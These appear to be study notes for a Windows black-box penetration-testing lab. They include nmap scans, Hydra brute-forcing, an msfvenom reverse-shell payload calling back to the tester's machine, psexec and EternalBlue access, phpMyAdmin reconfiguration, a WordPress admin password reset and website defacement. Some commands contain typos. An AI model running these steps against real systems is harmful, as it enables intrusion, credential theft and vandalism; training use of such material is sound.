# 7 - Windows Blackbox Exploitation

## <mark style="color:red;">Windows Black Box Penetration Test</mark>

### **Black Box Pentest**

* A Black box penetration test is a security assessment whereby the penetration tester is not provided with any information regarding the target system or network (No IP ranges, system information or default credentials are provided).
* The objective of a Black box penetration test is to accurately test the security of a system or network as an external unprivileged adversary.
* This approach is very useful as it demonstrates how an external attacker with no inside knowledge would compromise a company's systems or networks.

### **Penetration Testing Phases**

* The following diagram outlines the various phases involved in a typical penetration test.

### **Black Box Methodology:**

* Host discovery
* Port scanning & enumeration
* Vulnerability detection/scanning
* Exploitation
* Manual
* Automated
* Post Exploitation
* Privilege Escalation
* Persistence
* Dumping Hashes

### **Scenario & Scope**

* You have just begun your first job as a Junior Penetration Tester and have been assigned to assist in performing a penetration test on a client's network.
* The pentest lead has assigned you to gain access/exploit a host running Windows Server 2008.
* Your primary objectives are:
  * Identify services running on the target.
  * Identify vulnerabilities within the services.
  * Exploit these vulnerabilities to obtain an initial foothold.



## Practical Demonstration

#### <mark style="color:yellow;">Black Box Port Scanning & Enumeration</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# discovering hosts in the network, we can get the target ip 
cat /etc/hosts # ping it to confirm reachability.

# nmap scan 
nmap -sV $ip # scan 1000 commonly used ports.
nmap -T4 -PA -sC -sV -p 1-10000 $ip -oX nmap_10k # -PA-ack scan, -oX-xml format.
nc -nv $ip 21 # to get banner, but no luck.
# we opened the "http://$ip/4848" on the web browser to take a look at the service, $ip/8080, $ip/9200 etc.

# we get a lot of http service ports based on the nmap scan on line 6, so we view each of them.

service postgresql start && msfconsole # create a workspace for the target (Win2k8).
db_import /path_to_nmapscan # import the scan.
# if you want the OS name to be specified correctly in the "os_name" column in msfconsole db a trick is to use the SMB version module.
search smb_version
use 0
options
set RHOSTS $ip
run
hosts # host name is now specified correctlly.
services # view all imported services.

# we can also do a comprehensive scan
nmap -sV -T4 -PA -sC -p 1-65535 $ip -oV nmap_All # didnt do.
nmap -sU -sV $ip # udp scan.
```
{% endcode %}

#### <mark style="color:yellow;">1 - Targeting Microsoft IIS FTP (port 21)</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# check for anonymous access with nmap "ftp-anon" script or mannually with ftp $ip, enter "anonymous" as UN, which didnt work.

# we can use hydra to perform bruteforce on the ftp server.
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt $ip ftp # we got some creds.

# we can also check if the user "vagrant" exist also
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt $ip ftp # none exist but we can swap the wordlist and make use of the unix_users.txt in the "-P" option to check also. Save the creds.

ftp $ip # login with admin cred. We discover a .asp file, meaning the web server can execute .asp files....so we can generate a malicious .asp payload, upload it to get a reverse shell.

# using msfvenom to generate payload.
msfvenom -p wimdows/shell/reverse_tcp LHOST=$kaliIP LPORT=1234 -f asp > shell.aspx # we dont need a meterpreter shell here, hence we use normal reverse shell.

# login via ftp using the vagrant user.
ftp> put shell.aspx # upload the payload

# setup msfconsole to setup handler.
use multi/handler
set payload .....
set LHOST, LPORT. ..
run

# execute the file via the browser
# in this case we didnt get a reverse shell, even generating a .asp file didnt work also.

# what else can we do?
# attackers can deface the website since the "index.html" file is accessible in the ftp server.
get index.html

# open and edit, the upload it back.
put index.html
```
{% endcode %}

#### <mark style="color:yellow;">3 - Targeting OpenSSH</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# we can perform a bruteforce, using "varant" and administrator as the user.
# login with the user "vagrant", we got a shell session.

# we can use the "use auxililary/scanner/ssh/ssh_login" module to obtain a meterpreter session, set USERNAME, PASSWORD to "Vagrant".
# upgrade to a meterpreter session "sessions -u 1" - but it failed.

# we can generate a meterpreter payload, and transfer it to the target via ssh, but that's not necessary in this case.

# in this case we can spawn a cmd shell session after loggin in via ssh using the "bash" cmd. Now we have a cmd prompt shell.

net localgroup administrators # check if the user is part of the local group.
whoami /priv # check user permissions.
```
{% endcode %}

#### <mark style="color:yellow;">4 - Targeting SMB</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sV -sC -p 445 $ip # indepth SMB scan.
hydra -l administrator -P /usr/share.../unix_users_or_password.txt smb # btrute force on smb. Test the "vagrant" user too.

# we can authenticate via rdp, but for now we are working on SMB.
smbclient -L $ip -U vagrant # list the vagrant shares.
smbmap -y vagrant -p vagrant -H $ip # list shares.
enum4linux -u vagrant -p vagrant -U $ip # enumerate other users on the PC.

# enumeratin shares with metasploit.
use auxiliary/scanner/smb/smb_enumusers_domain
set RHOSTS, SMBUser, SMBPass vagrant, run

# we can also use psexec.py script to authenticate.
locate psexec.py
chmod +x psexec.py
python3 psexec.py Administrator@$ip # login with psexec. We are NT AUTHORITY.

# msfconsole also have a psexec module (exploit/windows/smb/psexec).

# what is we have no creds.
# we can use the EternalBlue exploit to gain access to the user.
```
{% endcode %}

#### 6 - Targeting MySQL DB Server

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sV -sC -p 3306,8585 $ip # nmap scans.
searchsploit MySQL 5.5 # but we got nothing.
# perform a bruteforce with Metasploit
search mysql_login
use 0
# we found  out no password for the "root" user.
mysql -u root -p -h $ip # login mysql
show databases; # display dbs.

# we cant access the phpmyadmin page, so what we can do is use the previous SMB module, gain a meterpreter session, download the phpmyadmin file, edit and modify the config options.
# we use Metasploit to exploit the EternalBlue vuln and get meterpreter session.
meterpreter > cd C:\ # we see a folder named "Wamp" this stores web application files, check the "apps" or "Www" folder.

# we also could have identified the "MySQL" cred by taking a look at the "C:\Wamp\www\wordpress\wp-config.php" directory, we can see the MySQL creds.

# back to line 10, lets get the "phpmyadmin" file
meterpreter > cd C:\Wamp\alias\ # we locate the file.
meterpreter > download phpmyadmin.conf # download the file to kali, so you can modify it with nano or vim.
# we can delete other rules there, then modify the "Allow from 127.0.0.1" to "All from all".
# upload the modified file, which automatically replaces the default one. confirm it by "cat phpmyadmin.conf".

# for the effect to take place we have to restart the apache service.
shell # spawn a cmd prompt shell.
C:\wamp\alias> net stop wampapache # stops the service.
C:\wamp\alias> net start wampapache # starts the service. Now we are able to access the phpmyadmin page from the browser.

# now we clicl the "wordpress" button, wp_users button, we can modify the "admin" account password. click "Edit", select MD5 in the "user_pass" row and change the password.

# now we can goback to the homepage of the site, and login as "Admin" in Wordpress.
$ip:8585/wordpress/wp-admin # login as admin. This gives us aacces to the entire website.
```
{% endcode %}

####

